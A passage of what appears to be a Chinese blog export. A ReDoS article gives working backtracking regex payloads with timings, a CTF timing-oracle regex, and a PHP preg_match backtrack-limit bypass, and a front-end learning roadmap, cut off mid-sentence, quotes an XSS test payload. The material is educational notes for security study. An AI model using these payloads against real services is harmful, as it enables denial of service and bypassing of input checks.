這時候我故意在點菜單上面鬼畫符，但有些地方看似正常，讓菜單看起來很吃力，機器人的辨識功能沒有做好，沒辦法解讀，於是就停擺了，這就叫做 DoS，以一己之力耗盡資源。 我找一百個人去你那邊，每個人都畫一堆空白菜單丟給機器人，讓機器人應接不暇，沒辦法處理其他客人的菜單，這就叫做 DDoS。 簡單來說呢，DoS 通常是「以少量的資源就能造成服務中斷」，而 DDoS 則是「用比超級多的資源直接把你服務打掛」。 好，讓我們講回 DoS，從前面的例子可以看出來，當你的程式本身就有一些問題的時候，是最容易出事的。符合了這個前提，就很容易以一人之力，用簡單的方式把你的服務弄掛。 而 ReDoS 就是靠著沒寫好的 regular expression 來達成這件事。 話不多說，直接舉例直接看範例最快： console.time('test'); /(a|a?)+$/.test('a'.repeat(25) +'b'); console.timeEnd('test'); // test: 2128.498046875 ms 一個 26 個字的字串，需要 2 秒鐘才能配對完畢。順帶一提，這個 regexp 所需要的時間是以倍數計算的，再多一個字需要 4 秒，然後 8 秒，16 秒，以此類推。 那為什麼這個 regexp 需要這麼久的時間呢？ 這跟 regexp 引擎的實作以及原理有關，細節我也還沒研究清楚就不誤導大眾了，但簡單來說就是 regexp 引擎必須要遍歷所有的可能性以後才能發現字串不符合，所以花了這麼久的時間。 總而言之，如果 regexp 沒寫好，會造成使用的時候消耗大量時間。 實際案例你可能會想說，regexp 有這麼容易寫壞嗎？ 還真的有，一大堆的 library 都出現過 ReDoS 的漏洞，還有人整理出一個詳細的列表：Awesome ReDoS Security 舉例來說，CKEditor 以前有一個偵測是否是圖片網址的 regexp，傳入精心構造的字串後需要 6 秒才會執行完畢： // from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0 const IMAGE_URL_REGEXP = new RegExp( String( /^(http(s)?:\\/\\/)?[\\w-]+(\\.[\\w-]+)+[\\w._~:/?#[\\]@!$&amp;'()*+,;=%-]+/.source + /\\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)\\??[\\w._~:/#[\\]@!$&amp;'()*+,;=%-]*$/.source ) ); console.time('test'); IMAGE_URL_REGEXP.test('a.' + 'a'.repeat(100000)) console.timeLog('test') // test: 6231.137939453125 ms 雖然說字串長度有 10 萬，但如果改成沒問題的版本，不到 1 毫秒就能跑出結果： // from: https://github.com/ckeditor/ckeditor5/commit/e36175e86b7f5ca597b39df6e47112b91ab4e0a0 const IMAGE_URL_REGEXP = new RegExp( String( /^(http(s)?:\\/\\/)?[\\w-]+\\.[\\w._~:/?#[\\]@!$&amp;'()*+,;=%-]+/.source + /\\.(jpg|jpeg|png|gif|ico|webp|JPG|JPEG|PNG|GIF|ICO|WEBP)(\\?[\\w._~:/#[\\]@!$&amp;'()*+,;=%-]*)?$/.source ) ); console.time('test'); IMAGE_URL_REGEXP.test('a.' + 'a'.repeat(100000)) console.timeLog('test') // test: 0.570068359375 ms 以 JavaScript 來說，這些配對的程式碼都是跑在 main thread，如果是網頁的話會直接畫面凍結，直接卡死，如果是以 Node.js 來執行的伺服器也會卡住，無法處理其他請求。 該怎麼知道有沒有 ReDoS 的風險？有一些現成的工具可以幫忙，我自己最常用的是這個：https://devina.io/redos-checker 只要把 regexp 丟進去，就可以跟你說有沒有問題，有的話還會附上測試的字串，讓你可以自己再測試一遍。 不過有時候會有 false positive 就是了，它覺得有但是沒有，或也有可能真的有，但是它給的攻擊字串跑不出來。因此還是建議測完以後自己拿它給的 payload 再試一次，確認一下。 ReDoS 在攻擊上的應用前面講的都是「regexp 已經寫好，而使用者可以控制輸入」，這時候只要找到有問題的 regexp 產生攻擊字串即可。 而有另外一種狀況是：「使用者可以控制 regexp」。舉例來說，假設有個網站提供搜尋使用者的功能，你可以傳入一個 regexp，伺服器就會回傳是否有符合此 regexp 的 username 存在。 伺服器的實作大概如下（隨意寫的，意思有到就好）： app.get('/search', (req, res) => &#123; const q = req.query.q return users .filter(user => new RegExp(q).test(user.username)) &#125;) 這個危險的功能除了可以讓攻擊者把所有的 username 都拿到手以外，也會有 ReDoS 的風險在。 舉例來說，當 /((([^m]|[^m]?)+)+)+$/ 這個 regexp 碰到 &quot;username&quot; 時，需要花費將近 4 秒才能跑完： console.time('test'); /((([^m]|[^m]?)+)+)+$/.test('username') console.timeEnd('test'); // test: 3728.89990234375 ms 只要繼續按照相同的模式把 regexp 延伸下去，就可以讓這整段程式碼執行超過 30 秒或是更久，癱瘓整個 server。 在打 CTF 時還有另一種常見的狀況是一樣可以傳入 regexp，但是伺服器不會跟你講有沒有成功，你只能根據時間差來判斷，這時候靠 ReDoS 就很有用了： console.time('CTF&#123;a'); console.log(/CTF&#123;[a](((((.*)*)*)*)*)!/.test('CTF&#123;this_is_flag&#125;')) console.timeEnd('CTF&#123;a'); // CTF&#123;a: 0.071ms console.time('CTF&#123;t'); console.log(/CTF&#123;[t](((((.*)*)*)*)*)!/.test('CTF&#123;this_is_flag&#125;')) console.timeEnd('CTF&#123;t'); // CTF&#123;t: 24.577s 透過傳入精心構造的 regexp，就可以利用時間差得知第一個字元是什麼。 最後簡單提一下防禦方式，最根本的解決方法就是不要寫出有缺陷的 regexp，先去學習哪一些 pattern 應該盡量少用，就能掌握到大概的方向。除此之外，似乎也有人做了一些自動化的工具幫忙掃 code 裡面出現的 regexp，這也是一種在出事前先預防的方法。 為了防止 ReDoS 而出現的另一種問題底下這段 PHP 的程式碼會檢查輸入是否為 PHP 的格式，如果不是的話才進行後續操作，你有辦法繞過正規表達式嗎？ &lt;?php function is_php($data)&#123; return preg_match('/&lt;\\?.*[(`;?>].*/is', $data); &#125; if(!is_php($input)) &#123; // fwrite($f, $input); ... &#125; 答案是有辦法，但繞過的並不是正規表達式本身，而是利用了 PHP 的一個機制。 PHP 為了防止 ReDoS 的發生，設有回朔次數的上限，如果超過了上限，就會回傳 false，而非原本預期的 0 或是 1。雖然 PHP 的文件裡面有就有提到這點，但老實說會乖乖去看文件的還是少數，因此我相信有不少開發者都不知道這個行為。 因此，只需要構造出一個與 ReDoS 類似的結構觸發上限，就會讓 preg_match 回傳 false，進而繞過檢查。 上面的範例來自於 phith0n 在 2018 年發表的文章：PHP利用PCRE回溯次数限制绕过某些安全限制，而 2019 年的 Facebook CTF 中也有一題是相同的原理，可以參考 balsn 的 writeup。 甚至於這個漏洞在 2023 年也出現在現實世界中：MyBB Admin Panel RCE CVE-2023-41362。 總結我自己覺得 ReDoS 是一個滿有趣的攻擊方式，以前沒想過靠著 regexp 還可以做出這種效果。 以前第一次知道這個攻擊，似乎是還在當開發者的時候，偶爾會看到使用到的 library 有這個漏洞，不過當初沒有很在意就是了。後來在資安裡面再度碰到這東西，才覺得好像挺有趣的。 這篇比較像是我的個人筆記，只是想趁著記憶猶新的時候把一些 payload 記下來，以後比較好找。 最後附上一些參考資料以及延伸閱讀，有興趣深入了解的讀者們可以看一下： HackTricks - Regular expression Denial of Service - ReDoS OWASP: Regular expression Denial of Service - ReDoS snyk: ReDoS","link":"/2023/06/12/redos-regular-expression-denial-of-service/"},{"title":"紮實的網頁前端學習路線與資源推薦","text":"（原文寫在 Medium，順便在這邊備份一下） 雖然說我一直很清楚自己目前偏好的學習方法以及路線，並且把我認為適合的路徑都變成上課的大綱拿去教學，但一來好像沒多少人會去看那個大綱，二來大綱並沒有詳細解釋背後的原因。因此我才覺得自己有必要寫這一篇，來寫一下自己認為比較「紮實」的網頁前端學習路線。 在開始之前有幾點必須先說明一下。 首先，此文章我預設的對象是毫無程式基礎的人。若你已經有了程式基礎，可以自行略過相關的單元。另外，對於毫無基礎又想轉職的人來說，這篇絕對不是「最快」轉職指南。 求快的話我相信文章裡提到的東西很多都不用學，畢竟現在有些工作的門檻低到我自己都嚇到了。但一心求快只會讓不穩的基礎更不穩。就算找到工作了，可是然後呢？就不再加強自己了嗎？就讓自己的實力停留在那邊嗎？ 若你想把這份工作做得長久，總有一天要面臨這些問題，那些以前沒學好的基礎，會在將來你困惑為什麼上不去時反噬你。每個人認為的「必備」以及對「紮實」的定義都不一樣，例如說有人會覺得只要把資工系教的那些科目修完就叫做紮實，其他都沒那麼重要。而這篇寫的是我自己認為紮實的路線。 這篇文章會告訴你「我認為」應該要學什麼，以及應該要照怎樣的順序學。最重要的是，我會附上理由。你可以自行判斷背後的理由是否合理，來決定是否要按照這個順序學。理由才是最重要的。 如果有時間，可以先參考這兩篇我以前寫過的文章： 當我們在學程式時，要學的到底是什麼？ There is no magic in my classroom 底下的學習路線基本上是從我之前的課綱改編而來，而且是秉持著上面這些原則在設計的。另外，下面比較多其實都是告訴你該學哪些工具，但請記住在學工具的時候，還必須去思考為什麼需要用到這些工具，它們解決了哪些問題。此篇文章只專注於網頁前端的領域，其餘工程師的基本功（例如說拆解問題或是定義問題範圍等等）不包含在裡面。 推薦資源的部分，原則上我只推薦自己嘗試過並且真的覺得很不錯的資源，所以並不是每個部分都會有。沒有的話可以自己透過 Google 尋找，學會找資料也是很重要的一環。 底下文章會很長，因為又要寫理由又要寫目標，我先附上學習路線： Command Line 的使用 Git 的使用 npm、Node.js 與 JavaScript 程式基礎 單元測試 Unit Testing 與 Jest 網路基礎概念 HTML 與 CSS JavaScript 與 DOM 以及事件機制 非同步與 AJAX 基礎後端 PHP 與 MySQL 資訊安全概念 學習後端框架 Express 後端部署 jQuery 與 Bootstrap CSS 預處理器 非同步歷程：callback、promise 與 async&#x2F;await 深入理解 JavaScript 與瀏覽器相關機制 gulp 與 webpack 物件導向 React&#x2F;Vue&#x2F;Angular 三選一 接著底下就是每一點的詳細介紹。 1. Command Line 的使用這是拉近你與電腦距離第一步，也是要開始學程式前最重要的基礎。 先大概講一下 Command line 是什麼，基本上就是你看電影時會看到電腦高手在一個黑底白字的視窗上打一堆指令（command），而第一步就是要學習怎麼使用這些基本指令。 我的 Terminal，有改過所以比較漂亮 學習理由這一步之所以放最前面的原因有兩個，第一個是它讓你從以往的圖形使用者介面（Graphical User Interface，GUI）切換到命令列介面（Command Line Interface，CLI）。講白話一點，你以前要看桌面有什麼檔案，就用滑鼠點開檔案總管或是 Finder 就行了，你是靠著這些圖形介面去操作的。 但 Command line 之所以不同，是因為它是用文字去操作。就像我上面的截圖那樣，打一個神奇的指令 ls -al，就可以列出資料夾底下的所有檔案。 寫程式的本質跟使用 Command line 是一樣的： 利用指令與電腦溝通 第二個原因是它在程式開發裡非常重要。如果你是做設計相關的，電腦裡可能會有 PS、AI 或是 Sketch 等等的軟體，想用的時候只要滑鼠點兩下就可以了。但我們寫程式的不一樣，很多工具都沒有提供圖形介面，你只能使用指令（Command line）去操作它。 學習目標只要學會常見指令（例如說 cd、ls、rm、mv 等等）即可。 2. Git 的使用假設你有一個很喜歡改東西的主管，他請你幫忙畫一張圖。於是你畫好以後把圖片存成 v1.ai 並交給主管看，而主管說不行，要再改，就有了 v2.ai。後來主管說：「顏色改一下就差不多了」，你就把圖片改完以後存成 final.ai。 可誰知道主管看完以後又說要改，而且還要從 v2 開始改（這時你就會慶幸你有存起來），你只好打開 v2 的檔案，改完以後存成 v2–2.ai。 接下來的故事不用多說了，final.ai、real-final.ai、fucking-final.ai、real-real-final.ai，最後電腦出現了一大堆你也不知道哪個才是最終版的檔案，把自己搞得頭昏腦脹。 這是我自己放履歷的資料夾，我都不知道哪個才是最新的了… 版本控制是一件難事，尤其是透過這種傳統式的複製貼上，只會讓自己搞混。如果一個人搞混其實還行，頂多再花一點時間來找，但如果是一整個團隊協作一份文件，那問題就大了。 而軟體工程師就是一個逃不開團隊協作，也逃不開版本控制的一個行業。例如說目前版本是 v2 穩定版，於是小明繼續開發 v3 的新功能。可是某天 v2 卻被發現了一個 bug！負責救火的小華效率很高，不到一天就把 bug 修掉了。 可是問題來了，已經寫好的新功能不能發布，因為 v3 還沒開發完成，可是修好 bug 以後又要趕快讓使用者更新成新的版本，那怎麼辦呢？這就是需要版本控制的時候了。 講了這麼多，我只是想說明在寫程式上（尤其是多人協作時）版本控制的重要性，而最有名的一套協助你做版本控制的程式就叫做 Git。 學習理由會放在第二個要學的東西，是因為先學了 Git 以後你就可以體驗幫自己以後寫的程式碼做版本控制。雖然說只有一個人的話，有些團隊協作才會碰到的困難會體驗不到，但沒關係，還是可以先從基礎的開始學。 學習目標 學習 Git 基本概念：什麼是 repository、什麼是 commit、什麼是 staged… 學會使用 add、commit、status、log 等基本指令 搞清楚 Git 與 GitHub 的差別並學會 push、pull、clone、fetch 學會使用 branch 與 checkout 如果要學 branch 的使用，誠心推薦 Learn Git Branching。 3. npm、Node.js 與 JavaScript 程式基礎JavaScript 只是一個程式語言，目前主要可以跑在兩個環境上面，第一個環境眾所皆知，叫做瀏覽器，可以利用 JavaScript 去操作畫面；第二個環境叫做 Node.js，可以脫離瀏覽器獨立運作。你安裝好 Node.js 以後，輸入 node index.js 這個指令就可以在你電腦上執行 index.js 這個檔案。 這邊我希望大家先不要碰瀏覽器，而是在 Node.js 這個環境上執行自己的 JavaScript 程式碼。 因此這個階段就是要在自己的電腦上安裝 Node.js 環境，並且藉由 JavaScript 來學習程式語言的基礎（變數、判斷式、迴圈、函式等等）。推薦的學習資源是現代 JavaScript 教程。 那 npm 又是什麼呢？講到 npm 以前我們要先來講什麼是 library，在程式領域裡面不會翻叫圖書館，而是翻作「函式庫」，就是很多函式的集合啦。 簡單來說呢，有些功能不是很常用嗎？可能我會用到、你會用到、獨眼龍也會用到，那獨樂樂不如眾樂樂，與你分享的快樂勝過獨自擁有，我今天寫好一大堆常用的 function，可以給其他人用，皆大歡喜。這就叫做「我寫了一個 library 給別人用」。 npm 全名為 Node Package Manager，這邊的 package 就跟上面講的 library 差不多，中文翻作「套件」。是一個管理 Node.js 相關套件的服務，因此你可以發布自己寫好的套件到上面去，也可以透過 npm 安裝別人寫好的套件。 學習理由有些人看到這邊可能會問說：「怎麼不是先學 HTML 與 CSS？」 我的理由是這樣的，既然是要走網頁前端，那就一定要學 JavaScript 這個程式語言，只是早學晚學的問題而已。而 HTML 與 CSS 能夠快速帶給學習者成就感，因為能夠立刻看見自己到底學了什麼，是能夠補充學習動力的科目。 在學新東西的時候，一定是剛開始最有毅力，之後就會慢慢消退，拖延症開始發作。選在這時候學 JavaScript 就是因為這樣。我覺得趁著動力還沒消退的時候先學比較好，後面才學 HTML 與 CSS，順便把動力一起補上。 而 npm 之所以重要，是因為你以後會很常用到 npm。在這個階段可以自己找一些簡單的套件來試用看看，順便練習看文件。 學習目標想要測驗自己有沒有學好程式語言基礎的話，可以透過一些簡單的小題目來驗證，也可以寫一些 Codewar 的題目。只要裡面提到的那些基本的題目能寫得出來就 ok 了。 npm 的話只需要知道以下概念： 什麼是 package.json npm install 做了什麼事情 4. 單元測試 Unit Testing 與 Jest上個階段有說可以寫一些小題目來測驗自己的程式基礎是否合格。在像是 Codewar 那種網站上面，它會幫你改，會告訴你錯在哪裡，可是在自己的電腦上要怎麼測呢？ 簡單嘛，就是自己想幾個測試案例，然後用 console.log 印出答案是不是對的。 感謝 https://carbon.now.sh 提供的服務 沒錯，這樣子是可以的，但其實這不是一個好方法。因為你必須要用肉眼去判斷到底是哪一個 test case 出了錯，若你的 test case 變多，也很難一時之間看出來到底答案是不是對的。 閃開！讓專業的來！（突然發現這句話也很有年代感了） Jest 是一套專門讓你測試 JavaScript 程式碼的框架，只要用它指定的架構及函式，就可以輕易寫出用來測試的檔案，而且還會有精美的測試報告。 而這種針對 function 的輸入以及輸出做測試的方式，我們稱之為單元測試（ Unit Testing）。測試寫得好，程式就不怕改壞掉。因為只要跑一下測試，就能看出程式碼寫得是否正確。 學習理由會把單元測試放在這的理由是因為我覺得放這裡最貼切。上個階段會寫一堆小的 function，學了 Jest 之後剛好可以幫這些 function 加上單元測試，體驗看看測試的威力。 學習目標 知道如何使用 Jest 測試一個 function 的輸出入 盡力想出各種 test case 5. 網路基礎概念在正式進入到網頁前端最有名的 HTML 與 CSS 之前，還有最後一件事情要做，那就是稍微知道一下網路的基礎概念。 在這階段你必須知道的東西包括但不限於： 什麼是前端？什麼是後端？ 什麼是 Request？什麼是 Response？ HTTP 是什麼？HTTP 的 method 又有哪些？ HTTP 的常見狀態碼（200、301、302、400、404、500…） 什麼是 API？ 理解這些概念以後，可以試著找一些現成的 API，然後使用 Node.js 的一些套件例如說 request 或是 axios 來嘗試串接看看。 沒有到很清楚沒關係，但基本的概念一定要有。因為一堆新手都對這方面幾乎毫無概念，導致發生問題時根本就找錯癥結點，花了很多時間才發現錯誤根本不是出在自己想像的地方。 這邊會推薦一些比較理論性的課，除了網路的概念以外也可以順便補齊其他基本概念： Crash Course [CS101] 初心者的計概與 coding 火球術 學習理由會把這些網路概念放在這麼前面，是因為我在各個技術相關社團裡面看過太多太多搞錯領域的問題了。明明要問的是前端，卻在後端的社團發問，以為跟後端用的框架有關；明明是網路出了錯，卻以為是前端的問題。這些我都認為是沒有建立起整體網路的概念所導致的。 學習目標 知道什麼是 Request 跟 Response 知道什麼是 DNS 知道 localhost 跟 127.0.0.1 是什麼 知道什麼是 API 會使用 Node.js 寫出串接 API 的程式 知道 HTTP method 有哪些 知道基本的 HTTP status code，像是 200、301、400、404、500 6. HTML 與 CSS前面鋪墊了這麼多，終於可以開始學 HTML 與 CSS 了。前者是網頁的骨架，後者是網頁的衣服。HTML 就只是用特定格式以及標籤組合而成的檔案，你必須選擇適合的標籤來表示內容，只要理解一些常見標籤就差不多了，而學習的重點有兩個。 第一個是要讓自己的 HTML 符合語意（semantic）。例如說你今天有一個列表，比起用一大堆 &lt;div&gt;，用 &lt;ul&gt; 跟 &lt;li&gt; 會更適合的多。該怎麼檢測呢？你不要看畫面，只看 HTML 原始碼的標籤，試看看能不能看出每個區塊代表的意思或是重要程度，如果可以的話，就代表你寫得不錯。 第二個是可以稍微關注一下 SEO（Search Engine Optimization），這其實跟上一點滿相關的。搜尋引擎會需要去爬很多網頁，並根據網頁的原始碼來解析。SEO 就是要讓它們能夠看懂你的網頁，知道你網頁上的重點是什麼。 舉例來說，假設現在有兩個網頁，第一個全部都只有 &lt;div&gt; 標籤，第二個有用 &lt;h1&gt; 把大標題寫出來。機器人看得懂哪一個？當然是第二個，因為 h1 就代表著大標題，它就會把裡面的內容視為是這個網頁的主題之一。 或是這樣說吧，標籤就像是寫文章的排版一樣，用得不好的沒有粗體、沒有標題甚至還沒有句號，一眼望去全部文字都長得一樣，分不出哪些是大標哪些是小標。用得好的標籤就是優質的排版，一目瞭然，有什麼都十分明瞭。 HTML 只能對網頁做基本的排版，需要進一步美化的話你需要 CSS。利用 CSS 你可以「針對網頁上不同地方」給予不同樣式，例如說 A 區塊背景是紅色，B 區塊背景是綠色等等。 這就帶出了 CSS 的第一個重點：我要怎麼選到我想選的地方？ 這叫做 CSS 選擇器（Selector），有一些規則要學，可以透過標籤、class、id 或更複雜的方式來選到想要的元素。學完一些基本的之後可以透過 CSS dinner 這個超可愛又好玩的遊戲來複習並加強對 selector 的理解。 再來就是跟排版相關的了，要知道什麼是 box model，知道 position 跟 display 所有屬性的差異，這都是排版很重要的東西。 為什麼它們重要？因為如果不理解以上機制的話，是沒辦法排版的。盒模型代表著瀏覽器怎麼去看每一個元素，而 display 決定了這些元素能不能排在同一行，position 可以讓你隨心所欲的放置元素。 另外，也必須知道如何使用 Flexbox 排版。可以透過好玩的 Flexbox Froggy 或是 Flex Pirate 來學習。如果有時間的話也可以看看比較新的屬性 grid，並且玩一下這個小遊戲：Grid Garden。 最後，也要知道該怎麼在不同螢幕尺寸上做不同的排版。 核心概念就是：「在不同尺寸上套用不同的 CSS」，例如說你原本是兩欄式排版，在使用手機觀看的時候就把這兩欄的寬度都設為 100%，就變成上下兩行的排版而不是並排了，這樣比較符合手機的使用習慣。 要做到這件事情需要透過 media queries 這個寫法，依照不同的條件（例如說螢幕寬度、高度等等）來載入不同的 CSS。 前面已經有講 CSS 學習時的重點了，但理論畢竟只是理論，你千萬不要想著看一看教學文就能夠理解那些理論到底想表達什麼。 我以前看了 position 的解釋千萬遍，卻從來都不理解 position: absolute 到底是根據誰定位，然後要拿來幹什麼。直到有一天我必須實作一個在圖片右上角放叉叉的功能，那時我才真的知道為什麼需要 absolute。 除了 CSS，其他東西也是這樣，光看是沒有用的。你看了 position 的解釋一百遍，還不如打開瀏覽器自己亂玩那些屬性一遍。 推薦的資源有： html &amp; css is hard Learn to Code HTML &amp; CSS MarkSheet HTML &amp; CSS : 網站設計建置優化之道（我學生推薦的） 學習理由要開始學習前端的話，一定要會 HTML 與 CSS，因為這兩者是網頁的基礎。 學習目標 知道如何使用有語意的（semantic）標籤 知道基本的 CSS Selector 知道盒模型（box model ）是什麼，以及 padding、margin、border、width&#x2F;height 與它的關係？ 知道 display 的幾種屬性：block、inline 與 inline-block 差別在哪裡 知道 position 的幾種屬性：static、relative、absolute、fixed 與 sticky 差別在哪裡 知道如何使用 Flexbox 來排版 知道如何使用 media queries 7. JavaScript 與 DOM 以及事件機制還記得我前面說過 JavaScript 基本上可以跑在兩個地方嗎？瀏覽器與 Node.js。在學完 HTML 與 CSS 以後，就可以來試著把 JavaScript 寫在瀏覽器上面了。 寫在 Node.js 與瀏覽器上面最大的差別就是 你可以使用 JavaScript 操作畫面 只要是頁面上看得到的東西，你都可以改。你可以新增元素、刪除元素、更改樣式，也可以針對不同的元素加上不同的事件監聽器（Event listener）。舉例來說，你可以監聽某個按鈕的 click 事件，使用者點下按鈕的時候你就會知道，就可以針對這個事件做出反應，例如說點下按鈕之後跳出一個 alert 之類的。 這個部分的學習重點有兩個，第一個是 JavaScript 是如何操作畫面的？是透過一個叫做 DOM（Document Object Model）的東西。簡單來說就是瀏覽器把畫面上那些 HTML 元素都轉成物件，並且提供給你一個 API 來操作它們。 像是 document.querySelector(‘#aaa’)，會回傳 #aaa 這個 DOM 物件，你只要改變它，畫面上的元素也會跟著改變。所以學習的第一個重點就是如何操作 DOM 物件。你要學會怎麼新增、修改以及刪除這些物件。 第二個重點則會放在事件機制。 我要怎麼幫元素加上 event listener？又要怎麼拿掉？如果加上兩個會怎樣？ 除此之外，DOM 的事件機制比你想像的更複雜一點，例如說你有兩個重疊的元素，外面是藍色叫做 Blue，裡面是紅色叫做 Red： 事件傳遞機制附圖 今天當你點擊 Red 這個方框的時候，Red 的 click 事件就被觸發了。但不僅如此，接著 Blue 的 click 事件也被觸發了！想一想其實也滿合理的，因為 Red 是在 Blue 裡面，藍色的方框不是中空的，只是被紅色蓋過去而已。 這就是這個部分要學習的重點：事件機制的運作方式，細項可參考底下的學習目標。 這邊學完以後，你就能做出任何「不牽涉到網路」的應用程式了。例如說單機就可以玩的數獨小遊戲或者是五子棋，都可以做得出來，因為這些都只是畫面跟事件的集合而已。 舉例來說，五子棋怎麼做？ 先用 HTML 與 CSS 畫出棋盤 偵測棋盤的點擊事件，點下去時畫一個棋子在點擊的地方 判斷棋盤上的棋子是否連成一線 是，遊戲結束 否，換另一個玩家的回合，回到第二步 不要以為你只學了這些而已，這些就是精髓了。只要你可以監聽事件，可以更改畫面，有什麼功能是做不出來的？把想做的東西拆解到最後，會發現其實都只是這些操作的組合而已，沒有什麼魔法在裡面，你需要的只是一點想像力而已。 學習理由如果要在瀏覽器上面學 JavaScript，那勢必要談到 DOM，才能操作畫面。 但前面我說過了，我不希望先講 HTML 與 CSS，我希望先講「程式語言 JavaScript」。這時候以 Node.js 環境來學習是比較好的方法，因為它不會牽涉到 DOM 或是其他前端的東西，它就只是個簡單的程式語言而已。 我認為這樣子能有兩個好處： 知道 JavaScript 不只能在瀏覽器上面跑 知道 JavaScript 只是個程式語言，DOM 是執行環境（瀏覽器）提供的東西，像是 Node.js 裡面就是沒有 DOM 的。 這樣才不會把執行環境跟 JavaScript 混為一談。 學習目標 知道 DOM 的基本操作，例如說插入、刪除、更改屬性等等 知道事件是如何傳遞的。知道什麼是捕獲，什麼又是冒泡。 知道 e.preventDefault 與 e.stopPropagation 的作用以及差別 知道 e.target 與 e.currentTarget 的差別 知道什麼是事件代理（Event delegation）以及適合用的場合 8. 非同步與 AJAX在上一個部分學完事件機制的相關概念以後，就只差最後一塊拼圖了，那就是 JavaScript 與後端的溝通。我們會使用一種叫做 AJAX 的技術，聽起來很困難，但說穿了其實就是用瀏覽器提供的 Web API 向後端發送 Request 並且拿到 Response。 這個部份對於前端來說超級無敵重要，因為會有很多概念需要理解，我們一個一個來。 第一個是瀏覽器的同源政策（Same-Origin Policy）。 當你利用 JavaScript 發送 Request 的時候，出於安全性的考量瀏覽器會有一些限制。不同的 Request 限制也不太一樣，但大原則就是「如果後端沒有允許你做這件事，就拿不到 Response」。所以通常需要後端的協助，來開啟 CORS（Cross-Origin Resource Sharing，跨來源資源共享）。 你必須搞清楚什麼是同源政策、為什麼要有同源政策，而它又限制了哪些東西。也必須理解該怎麼利用 XMLHttpRequest 或是 Fetch 來串接 API。 第二個是既然提到了AJAX，你也必須知道非同步（Asynchronous）是什麼意思。這邊有些人會被字面上的意思誤導，因為同步（Synchronize）看起來很像「同時做一件事」。 可是在電腦科學的領域裡面，同步指的其實是「一次只能完成一件事，要等前面的事情做完，才會做下一件事」。如果與後端 API 串接是同步的，會發生什麼事？可怕了，如果後端速度很慢，10 秒後才會回傳 Response，那 JavaScript 必須等 10 秒才能執行下一個指令。 這不可能嘛，不可能讓整個畫面卡住 10 秒，所以 AJAX 的第一個 A 就代表著 Asynchronous，意思就是非同步地去跟 Server 溝通並交換資料。 那非同步要怎麼拿到資料？這邊就會講到回呼函式（Callback function）的概念。你準備好一個函式，並且跟瀏覽器說：「欸，你過來一下，等你好的時候記得叫我」。 除了 AJAX 以外，計時器（例如說 setTimeout）也是非同步的，你不可能原地等三秒之後執行嘛，一定在中途還有做其他事情，三秒後才會觸發計時器。可是眾所皆知，JavaScript 的執行是 single thread，一次只能做一件事，那到底是怎麼樣做到非同步的？ 這就會牽涉到 Event Loop 的機制，我強力推薦這個影片，講的超級好：What the heck is the event loop anyway? | Philip Roberts | JSConf EU。 學習理由先來講一下為什麼建議這樣學，因為前面我們已經有了網路概念，也有了事件機制的概念，基礎的 JavaScript 都沒有問題了。而非同步的相關操作就是理解 JavaScript 的最後一塊拼圖，也是網頁前端很重要的一部分。 所以才會把 AJAX 放在這裡，等前面基礎打好以後再來接觸 AJAX，並且把非同步的相關概念一併理解。 學習目標 知道非同步與同步的差別 知道什麼是同源政策（Same-origin policy） 知道如何存取跨網域的資源（CORS） 知道如何使用 XMLHttpRequest 或 Fetch 串接 API 理解 Event loop 9. 基礎後端 PHP 與 MySQL接著我們要來學習基礎的後端開發，會學純 PHP，也就是在不使用任何 PHP 的框架下來學習。 另一個重點是資料庫，這邊選用最常見的 MySQL，而且 PHP + MySQL 這個組合有一堆現成的工具可以用，例如說 XAMPP，直接幫你把整個環境建好。 MySQL 的部分不要跑去學什麼 ORM（Object Relational Mapping），請乖乖地寫 SQL Query，好好學一下怎麼樣做 CRUD（Create、Read、Update、Delete），並且自己試著開 Table 然後決定欄位的資料格式。 學習理由看到這邊有些人可能會問：為什麼要學後端？ 來來來，有沒有注意到標題上的四個字？「網頁前端」，這同時代表著「網頁裡的前端」以及「網頁與前端」兩個意思。網頁分為前端跟後端，如果你只理解前端，你是永遠不可能理解整個網頁的。 就如同我在第五點網路基礎概念裡面提到的一樣，許多人都是缺乏了整體概念，才會導致出錯時定位錯問題，或是根本不知道問題發生在哪裡。學習後端最主要的理由就是補齊自己缺少的概念，當發生問題時你才知道問題到底出在哪裡。 這邊我不推薦學 Ruby on Rails，也不推薦 Laravel 跟 Express，而是推薦從 PHP 開始學——沒有使用任何框架的 PHP。 因為它夠簡單。一個 PHP 檔案就是負責一個頁面，你在檔案裡面 echo 什麼，畫面上就輸出什麼，十分簡單明瞭，而且很容易學。 若是你有學過一點程式或找過相關資料，可能會問說：「不對啊，可是這樣寫到後面 code 不會很髒嗎？全都混在一起，毫無架構可言！」 對啊，就是這樣，你說的很對——但我是故意的的。 如果全世界的生理男都長得像金城武，金城武還是帥的嗎？不是。金城武之所以帥，是因為你看過很多比他醜的人，你才知道金城武是帥的，這是比較而來的。 寫 code 也是同樣道理。你如果沒有寫過看過爛 code，你看到好 code 的時候怎麼知道它好在哪裡？你不會知道，而且你搞不好也認不出來那是好 code。你必須先寫過夠多爛 code，才會知道好 code 到底厲害在哪裡。 這就是為什麼我推薦從純 PHP 開始學，因為寫到後面你一定會寫得很髒很亂很難修改很難維護，但唯有這樣，接觸框架時才會知道框架到底好在哪裡。 學習目標 理解什麼是前端，什麼是後端 知道什麼是資料庫 了解基本的 SQL 語法，包括 Select、Insert Into、Delete 與 Update 能夠使用 PHP 做出簡單的留言板或是部落格 10. 資訊安全概念學後端還有一個好處，那就是你會更清楚常見資訊安全漏洞到底是怎麼出現的，以及如何防禦。 如果你聽我的去學純 PHP 的話，你很有可能會寫出有 SQL Injection 或是 XSS（Cross-site Scripting 跨站式腳本攻擊）以及 CSRF（Cross-site request forgery 跨站請求偽造）漏洞的網站。 平常看再多文章，都不如自己的網站出漏洞來的有感。像我之前的興趣之一就是攻擊學生們自以為防禦的很好的網站，讓他們知道資訊安全的重要性。 常見的資安漏洞通常都是沒有預料到使用者的輸入會長得那麼千奇百怪。 例如說你有一個留言板開放人家留言，後端直接把留言內容印出來，你可能會想說沒什麼。直到某天有人留了 &lt;script&gt;alert(1)&lt;/script&gt;，讓所有開啟留言板的人都彈出一個視窗，你才意識到：「靠腰勒，原來有人會輸入這麼奇怪的東西」。 學習理由再重新講一下為什麼我建議不要從框架開始學的理由。若是你學了框架，你很有可能碰不到 SQL Injection 與 